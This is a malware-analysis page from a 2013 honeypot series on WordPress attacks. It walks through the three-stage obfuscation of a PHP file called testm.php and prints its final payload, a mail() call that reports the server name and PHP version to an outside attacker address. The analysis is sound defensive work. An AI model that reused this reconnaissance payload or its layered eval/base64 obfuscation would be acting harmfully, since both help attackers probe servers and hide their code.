@@ -1,0 +1,180 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>PHParasites:  WordPress Malware</title>
+<meta name="google-site-verification" content="ixC4wtdetOlWNosRSwl6CFgRutGwfbq_9r9z534uRkY" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style type="text/css">
+html,body{margin:0;padding:0}
+body{font: 76% arial,sans-serif}
+p{margin:0 10px 10px}
+div#header h1{height:80px;line-height:80px;margin:0; padding-left:10px;background: #EEE;color: #79B30B}
+div#subheader h2{height:15px;line-height:15px;margin:5px; padding-left:10px;color: #79B30B}
+div#subsubheader h3{height:10px;line-height:10px;margin:5px; padding-left:12px;color: #79B30B}
+div#content p{line-height:1.4}
+div#content pre{line-height:1.4;margin:5px;font:100% courier;}
+div#content kbd{font:100% courier;}
+div#navigation{background:#B9CAFF}
+div#extra{background:#FF8539}
+div#footer{background: #333;color: #FFF}
+div#footer p{margin:0;padding:5px 10px}
+div#wrapper{float:left;width:100%}
+div#content{margin: 0 25%}
+div#navigation{float:left;width:25%;margin-left:-100%}
+div#extra{float:left;width:25%;margin-left:-25%}
+div#footer{clear:left;width:100%}
+</style>
+</head>
+<body>
+<div id="container">
+<div id="header">
+	<h1>PHParasites:  WordPress Malware</h1>
+</div>
+<div id="wrapper">
+<div id="content">
+<div id="subheader"><h2>testm.php</h2></div>
+<p>
+This is my favorite example of obfuscation. The ultimate <kbd>testm.php</kbd>
+program is nothing special, but the way the writer
+tried to cover it all up is just so cute.
+</p>
+<p>
+Someone downloaded <kbd>testm.php</kbd> via the "uploadFile" action of (what
+they believed was) a previously uploaded <a href="wso.html">WSO web shell</a>.
+I don't understand why you'd use a program designed as an interactive user
+interface to do automated file download, but that's how the attackers did it.
+</p>
+<p>
+After only two seconds had elapsed from <kbd>testm.php</kbd> download,
+the IP address that sent <kbd>testm.php</kbd>
+tried to run it. <kbd>testm.php</kbd> turns out to be a reconnaisance
+program, basically checking if the machine it's downloaded on can
+send email to <kbd>tstmal@uymail.ru</kbd> via the PHP 
+<a href="http://php.net/manual/en/function.mail.php"><kbd>mail()</kbd></a> function.
+</p>
+<div id="subsubheader"><h3>Obfuscation</h3></div>
+<p>
+<kbd>testm.php</kbd> starts out as a single, 2007 character ASCII string.
+1273 characters of that string are obfuscated PHP. 
+The other 734 characters of the string appear to be more-or-less
+random ASCII gibberish.
+</p>
+<p>
+The 1273-character, cleartext, yet obfuscated PHP does an <kbd>eval(base64_decode())</kbd>
+on a 454-character piece of that 1273-characer cleartext.
+The base64_decoded string is stage 2 of a 3-stage deciphering process.
+</p>
+<p>
+<a href="stage2.reversed.phps">Stage 2 PHP</a> (eval'ed from the cleartext) uses
+<kbd>fopen()</kbd> to create a file handle referencing <kbd>testm.php</kbd>,
+and <kbd>fread()</kbd> to read
+1275 bytes of the <kbd>testm.php</kbd> file. This skips the cleartext
+(yet obfuscated) PHP code, plus 2 bytes. Then it reads 424 bytes of the
+734-character random ASCII gibberish that follows the cleartext PHP.
+</p>
+<p>
+Stage 2 uses <kbd>strtr()</kbd> and <kbd>base64_decode()</kbd> to turn
+those 424 bytes into some PHP, stage 3 of the deciphering process.
+Stage 2 does an <kbd>eval()</kbd> of the newly-deciphered Stage 3 PHP.
+</p>
+<p>
+<a href="stage3.reversed.phps">Stage 3</a> reads 300 bytes
+from <kbd>testm.php</kbd>, using the same file
+handle that Stage 2 opened. Using handles opened, or
+strings decoded or composed in an earlier stage of the deciphering
+is a hallmark of this code.  You think the code does something useless,
+only to find out later that it uses the result
+of the "useless" computation.
+</p>
+<p>
+Stage 3 runs the newly-read 300 bytes through the same <kbd>strtr()</kbd> and <kbd>base64_decode()</kbd>
+process as Stage 2 PHP used. I'd say that a different second cipher would have
+been more enjoyable to reverse engineer.  Stage 3 PHP also replaces
+all instances of the PHP file name with ... the PHP file name.  Seems like
+the misdirection in this otherwise interestingly-coded malware is a little
+unimaginative.  Anyway, Stage 3 ends up deciphering another piece of PHP,
+and <kbd>eval'ing</kbd> that new PHP.
+</p>
+<p>
+The final piece of PHP actuall does something other than decipher:
+</p>
+<pre>$IIIIIIIIIIII = 'tstmal@uymail.ru';
+echo mail(
+    "$IIIIIIIIIIII",
+    "{$_SERVER['SERVER_NAME']} = the subject",
+    'Test message = '.$_SERVER['SERVER_NAME'],
+    "From: $IIIIIIIIIIII\r\n-To: $IIIIIIIIIIII\r\nX-Mailer: PHP/".phpversion()
+);
+</pre>
+<p>
+It communicates to 'tstmal' the server name and the version of
+PHP running on that server, along with the fact that the rest of the
+server can send SMTP email.  If the server can't send email, the
+<kbd>echo</kbd> of what <kbd>mail()</kbd> returns can probably tell
+'tstmal' something about the server's software.
+The email is pretty obviously machine-parsable, too.
+</p>
+<div id="subsubheader"><h3>Coding Style</h3></div>
+<p>
+I think a single person coded this self-referential little gem.
+Variable names are consistently chosen to be visually indistinct
+but always in the same style or pattern
+(<kbd>$OO00O0000</kbd> vs
+<kbd>$OO00O00O0</kbd> for instance).  Newly-deciphered code uses
+file handles, variables and strings created by previous chunks of code.
+</p>
+<p>
+Due to the fact that the email it composes is buried under three decipherings
+and an obfuscation, I'd have to say that whoever downloaded the <kbd>testm.php</kbd>
+wrote it, or had a program that wrote it. <kbd>testm.php</kbd> doesn't seem
+amenable to the apparent "pass around" nature of a lot of PHP malware.
+</p>
+<!--
+<p>
+A few extra characters do appear in the apparently random ASCII gibberish -
+two '=' characters appear, but get truncated by <kbd>strtr()</kbd> calls,
+and 8 extra characters of gibberish exist that never get deciphered.
+The initial plaintext PHP creates a string that names the <kbd>fgets()</kbd>
+function, but never calls <kbd>fgets()</kbd>. 
+</p>
+-->
+</div>
+</div>
+
+<div id="navigation">
+<div id="subheader"><h2>Sections</h2></div>
+<ul>
+	<li><a href="index.html">Introduction</a>.</li>
+	<li><a href="details.html">Honey Pot Details</a></li>
+	<li><a href="access.html">Obtaining Access</a></li>
+	<li><a href="comment_spam.html">Spam Posts</a></li>
+	<li><a href="wso.html">WSO Web Shell</a></li>
+	<li><a href="login.html">WSO Session Example</a></li>
+	<li><a href="emailers.html">Email Spam Tools</a></li>
+	<li><a href="recon.html">Reconnaissance Tools</a></li>
+	<li><a href="gateway.html">File Retrieval Gateway</a></li>
+	<li>Obfuscated Code Champion</li>
+	<li><a href="backdoors.html">Back Doors</a></li>
+</ul>
+</div>
+
+<div id="extra">
+<div id="subheader"><h2>Author</h2></div>
+<p>
+<a href="mailto:bediger@stratigery.com">Bruce Ediger</a>, October, 2013.
+</p>
+<div id="subheader"><h2>Code</h2></div>
+<p>
+<a href="testm.phps">Original testm.php</a>.
+</p>
+<p>
+<a href="stage2.reversed.phps">Reverse engineered Stage 2 PHP</a>.
+</p>
+<p>
+<a href="stage3.reversed.phps">Reverse engineered Stage 3 PHP</a>.
+</p>
+</div>
+<div id="footer"><p>Up to Bruce Ediger's <a style="color:white;" href="/">Web pages</a>.</p></div>
+</div>
+</body>
+</html>
